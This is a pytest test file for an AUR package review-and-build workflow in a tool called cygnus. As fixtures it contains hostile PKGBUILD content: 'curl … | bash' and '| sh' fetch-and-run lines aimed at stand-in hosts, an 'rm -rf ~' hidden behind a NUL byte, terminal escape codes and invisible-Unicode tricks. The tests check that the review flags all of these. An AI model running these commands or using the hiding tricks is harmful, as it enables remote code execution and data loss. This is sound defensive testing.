"""AUR flow against a local stand-in for aur.archlinux.org: review before build, build what was reviewed."""

import subprocess
from pathlib import Path

import pytest

from cygnus.core.errors import CygnusError
from cygnus.core.ops import aur_ops

pytestmark = pytest.mark.needs_tool("git", "makepkg", "fakeroot")

PKGBUILD = """pkgname=hello-cygnus
pkgver=1.0
pkgrel=1
pkgdesc="Cygnus test package"
arch=(any)
license=(MIT)
depends=({depends})
package() {{
  install -Dm644 /dev/null "$pkgdir/usr/share/hello-cygnus/marker"
  {extra}
}}
"""
SRCINFO = """pkgbase = hello-cygnus
\tpkgdesc = Cygnus test package
\tpkgver = 1.0
\tpkgrel = 1
\tarch = any
\tlicense = MIT
{deps}
pkgname = hello-cygnus
"""


def _git(*args, cwd):
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", *args], cwd=cwd, check=True,
                   capture_output=True)


@pytest.fixture
def aur(tmp_path):
    """A bare repository served as file://…/hello-cygnus.git, and a function to publish a new version."""
    remote = tmp_path / "aur"
    bare = remote / "hello-cygnus.git"
    subprocess.run(["git", "init", "--quiet", "--bare", "-b", "master", str(bare)], check=True)
    work = tmp_path / "upstream"
    subprocess.run(["git", "clone", "--quiet", str(bare), str(work)], check=True, capture_output=True)

    def publish(depends="", extra=""):
        (work / "PKGBUILD").write_text(PKGBUILD.format(depends=depends, extra=extra))
        deps = "\n".join(f"\tdepends = {d}" for d in depends.split())
        (work / ".SRCINFO").write_text(SRCINFO.format(deps=deps))
        _git("add", "-A", cwd=work)
        _git("commit", "--quiet", "-m", "update", cwd=work)
        _git("push", "--quiet", "origin", "HEAD:master", cwd=work)

    publish()
    return f"file://{remote}", publish


def test_review_shows_everything_before_anything_runs(aur):
    url, _ = aur
    checkout = aur_ops.fetch("hello-cygnus", base_url=url)
    r = aur_ops.review(checkout)
    assert set(r.files) == {"PKGBUILD", ".SRCINFO"} and "install -Dm644" in r.files["PKGBUILD"]
    assert r.srcinfo["pkgnames"] == ["hello-cygnus"] and r.srcinfo["depends"] == []
    assert r.previously_approved is None and r.hints == [] and len(r.commit) == 40


def test_suspicious_lines_are_pointed_out(aur):
    url, publish = aur
    publish(extra="curl -s https://example.invalid/x.sh | bash")
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert {h["why"] for h in r.hints} == {"downloads and runs a script"}
    assert r.hints[0]["file"] == "PKGBUILD" and "curl" in r.hints[0]["text"]


def test_updates_show_only_what_changed_since_your_approval(aur):
    url, publish = aur
    first = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    aur_ops.approve("hello-cygnus", first.commit)
    publish(extra="echo new step")
    second = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert second.previously_approved == first.commit != second.commit
    assert "+  echo new step" in second.diff


def test_builds_exactly_the_reviewed_version(aur, tmp_path):
    url, publish = aur
    checkout = aur_ops.fetch("hello-cygnus", base_url=url)
    reviewed = aur_ops.review(checkout).commit
    [pkg] = aur_ops.build(checkout, reviewed, tmp_path / "out")
    assert pkg.name.startswith("hello-cygnus-1.0-1-any.pkg.tar")
    listing = subprocess.run(["bsdtar", "-tf", str(pkg)], capture_output=True, text=True).stdout
    assert "usr/share/hello-cygnus/marker" in listing

    publish(extra="echo sneaky")  # changed upstream after the review
    checkout = aur_ops.fetch("hello-cygnus", base_url=url)
    with pytest.raises(CygnusError, match="changed after you reviewed"):
        aur_ops.build(checkout, reviewed, tmp_path / "out2")


def test_files_added_after_review_block_the_build(aur, tmp_path):
    url, _ = aur
    checkout = aur_ops.fetch("hello-cygnus", base_url=url)
    commit = aur_ops.review(checkout).commit
    (checkout / "extra.patch").write_text("not reviewed")
    with pytest.raises(CygnusError, match="not part of the reviewed version"):
        aur_ops.build(checkout, commit, tmp_path / "out")


def test_missing_dependencies_stop_the_build(aur, tmp_path):
    url, publish = aur
    publish(depends="cygnus-no-such-package-xyz")
    checkout = aur_ops.fetch("hello-cygnus", base_url=url)
    r = aur_ops.review(checkout)
    assert r.srcinfo["depends"] == ["cygnus-no-such-package-xyz"]
    with pytest.raises(CygnusError, match="missing dependencies cygnus-no-such-package-xyz"):
        aur_ops.build(checkout, r.commit, tmp_path / "out")


def test_package_names_are_validated():
    for bad in ["../etc", "Foo", "-rf", "a b"]:
        with pytest.raises(CygnusError, match="invalid AUR package name"):
            aur_ops.fetch(bad)


def _add_file(url, name, data: bytes):
    from pathlib import Path

    remote = Path(url.removeprefix("file://")) / "hello-cygnus.git"
    work = remote.parent.parent / "upstream"
    (work / name).write_bytes(data)
    _git("add", "-A", cwd=work)
    _git("commit", "--quiet", "-m", "add", cwd=work)
    _git("push", "--quiet", "origin", "HEAD:master", cwd=work)


def test_many_files_never_push_the_pkgbuild_out_of_the_review(aur, monkeypatch):
    url, _ = aur
    monkeypatch.setattr(aur_ops, "MAX_REVIEW_FILES", 5)
    for i in range(8):
        _add_file(url, f"{i:03}.txt", b"padding\n")
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert "PKGBUILD" in r.files and ".SRCINFO" in r.files  # shown first, always
    assert not r.complete and "Cygnus shows at most 5" in r.problems[0]


def test_hidden_characters_make_the_review_incomplete(aur):
    url, _ = aur
    _add_file(url, "PKGBUILD", PKGBUILD.format(depends="", extra="").encode().replace(b"pkgrel=1", b"pkgrel=1 #\x00\nrm -rf ~", 1))
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert not r.complete and "PKGBUILD is a binary file" in r.problems[0]  # a NUL byte: cannot be shown
    _add_file(url, "PKGBUILD", PKGBUILD.format(depends="", extra="echo safe\x1b[1A\x1b[2K").encode())
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert not r.complete


def test_build_refuses_an_incomplete_review(aur, monkeypatch, tmp_path):
    from cygnus.gui import service

    url, _ = aur
    monkeypatch.setattr(aur_ops, "MAX_REVIEW_FILES", 1)
    commit = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url)).commit
    with pytest.raises(CygnusError, match="could not show you these build files in full"):
        service.aur_build("hello-cygnus", commit, lambda _: None)
    assert aur_ops.approvals() == {}


def test_each_build_returns_only_its_own_package(aur, tmp_path):
    url, publish = aur
    checkout = aur_ops.fetch("hello-cygnus", base_url=url)
    out = tmp_path / "out"
    aur_ops.build(checkout, aur_ops.review(checkout).commit, out)
    publish(extra="echo v2")  # same version string, new build
    (out / "stale-1-1-any.pkg.tar.zst").write_bytes(b"x")
    checkout = aur_ops.fetch("hello-cygnus", base_url=url)
    built = aur_ops.build(checkout, aur_ops.review(checkout).commit, out)
    assert [p.name for p in built] == [p.name for p in out.iterdir()] and len(built) == 1


def _publish_files(url, files: dict[str, bytes], links: dict[str, str] | None = None):
    import os
    from pathlib import Path

    remote = Path(url.removeprefix("file://")) / "hello-cygnus.git"
    work = remote.parent.parent / "upstream"
    for name, data in files.items():
        (work / name).write_bytes(data)
    for name, target in (links or {}).items():
        (work / name).unlink(missing_ok=True)
        os.symlink(target, work / name)
    _git("add", "-A", cwd=work)
    _git("commit", "--quiet", "-m", "change", cwd=work)
    _git("push", "--quiet", "origin", "HEAD:master", cwd=work)


def test_a_linked_pkgbuild_is_never_counted_as_reviewed(aur):
    url, _ = aur
    _publish_files(url, {"data.bin": b"echo HIDDEN\x00\npkgname=x\n"}, links={"PKGBUILD": "data.bin"})
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert not r.complete
    assert any("PKGBUILD is a link" in p for p in r.problems) and any("data.bin is a binary" in p for p in r.problems)


def test_an_install_script_named_by_install_must_be_shown(aur):
    url, _ = aur
    body = PKGBUILD.format(depends="", extra="").replace("arch=(any)", "arch=(any)\ninstall=hidden.dat")
    _publish_files(url, {"PKGBUILD": body.encode(), "hidden.dat": b"post_install() { evil; }\x00"})
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert not r.complete and any("hidden.dat is a binary file" in p for p in r.problems)


def test_review_text_cannot_rewrite_the_screen(aur):
    url, _ = aur
    _publish_files(url, {"README": b"\x1b[2J\x1b[3J\x1b[Hall good\n"})
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert "\x1b" not in r.files["README"] and "\\x1b[2J" in r.files["README"]


def test_hints_cannot_be_switched_off_by_a_leading_parenthesis(aur):
    url, _ = aur
    body = "(:)\n" + PKGBUILD.format(depends="", extra="curl -s https://x.invalid/a | sh")
    _publish_files(url, {"PKGBUILD": body.encode()})
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert any(h["why"] == "downloads and runs a script" for h in r.hints)


def test_checksum_hint_is_linear(aur):
    import time

    url, _ = aur
    _publish_files(url, {"notes.txt": b"sha256sums=(\n" * 8000 + b"'SKIP')\n"})
    started = time.monotonic()
    aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert time.monotonic() - started < 3


@pytest.mark.parametrize("hider", ["​", "‍", "﻿", "­", "⁠", "؜", "️", "ㅤ",
                                   "\U000e0041", " "])
def test_invisible_unicode_makes_the_review_incomplete(aur, hider):
    url, _ = aur
    extra = f"cur{hider}l -s https://example.invalid/x | sh"
    _add_file(url, "PKGBUILD", PKGBUILD.format(depends="", extra=extra).encode())
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert not r.complete and any("invisible" in p for p in r.problems)
    assert hider not in r.files["PKGBUILD"]


def test_ordinary_non_ascii_text_is_fine():
    assert not aur_ops.hides_text("pkgdesc='Café für Ärzte — 日本語' # Mantenedor: José\n\tok")


# -- review round 4 ---------------------------------------------------------------------------------------
def test_install_names_expand_pkgname_and_pkgbase_and_keep_what_they_cannot_expand():
    names = aur_ops._install_names("pkgname=foo\ninstall=$pkgname.install\n", "")
    assert names == {"foo.install"}
    assert aur_ops._install_names("pkgbase=base\npkgname=('a' 'b')\ninstall=${pkgname}.install\n", "") == \
        {"a.install", "b.install"}
    assert aur_ops._install_names("pkgbase=base\ninstall=$pkgbase.install\n", "") == {"base.install"}
    # the .SRCINFO names count too, so a lying PKGBUILD cannot choose which file escapes the check
    assert aur_ops._install_names("pkgname=foo\ninstall=$pkgname.install\n",
                                  "pkgbase = foo\npkgname = other\n") == {"foo.install", "other.install"}
    # a variable that is not pkgname/pkgbase stays unexpanded, so the review reports it as not shown
    assert aur_ops._install_names("install=$HOME/x.install\n", "") == {"$HOME/x.install"}
    assert aur_ops._install_names("install=plain.install\n", "") == {"plain.install"}


def test_the_usual_install_equals_pkgname_dot_install_can_be_reviewed(aur):
    url, _ = aur
    body = PKGBUILD.format(depends="", extra="").replace("arch=(any)", "arch=(any)\ninstall=$pkgname.install")
    _publish_files(url, {"PKGBUILD": body.encode(), "hello-cygnus.install": b"post_install() {\n  echo hi\n}\n"})
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert r.complete, r.problems
    assert "post_install" in r.files["hello-cygnus.install"]


def test_an_install_script_that_hides_text_is_caught_even_when_named_with_a_variable(aur):
    url, _ = aur
    body = PKGBUILD.format(depends="", extra="").replace("arch=(any)", "arch=(any)\ninstall=$pkgname.install")
    sneaky = "post_install() {\n  echo hi\n  ‮# echo hidden\n}\n".encode()
    _publish_files(url, {"PKGBUILD": body.encode(), "hello-cygnus.install": sneaky})
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert not r.complete and any("hello-cygnus.install contains invisible" in p for p in r.problems)


def test_a_missing_install_script_still_makes_the_review_incomplete(aur):
    url, _ = aur
    body = PKGBUILD.format(depends="", extra="").replace("arch=(any)", "arch=(any)\ninstall=$pkgname.install")
    _publish_files(url, {"PKGBUILD": body.encode()})
    r = aur_ops.review(aur_ops.fetch("hello-cygnus", base_url=url))
    assert not r.complete and any("hello-cygnus.install" in p for p in r.problems)
